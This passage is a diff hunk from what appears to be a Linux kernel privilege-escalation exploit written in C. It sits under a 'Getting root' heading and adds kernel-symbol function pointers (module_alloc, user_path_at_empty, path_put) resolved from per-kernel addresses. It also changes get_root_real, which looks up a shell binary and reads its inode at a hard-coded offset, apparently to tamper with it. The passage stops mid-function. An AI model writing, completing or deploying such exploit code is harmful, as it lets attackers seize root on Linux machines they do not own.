@@ -162,15 +162,20 @@ struct kernel_info kernels[] = {
 
 // * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *
 
+struct trampoline {
+	
+};
+
 struct path {
 	void		*mnt;
 	void		*dentry;
 };
 
+void *(*module_alloc)(unsigned long) = (void *)X_module_alloc;
 int (*user_path_at_empty)(int, const char *, unsigned, struct path *, int *) = (void *)X_user_path_at_empty;
 int (*path_put)(void *) = (void *)X_path_put;
 
-static void get_root_real(void) {
+static void __attribute__((always_inline)) inline get_root_real(void) {
 	struct path path = { 0 };
 	if (!user_path_at_empty(AT_FDCWD, SHELL, 0, &path, NULL)) {
 		void *inode = (void *)(*(unsigned long *)(path.dentry + 48)); // dentry->d_inode
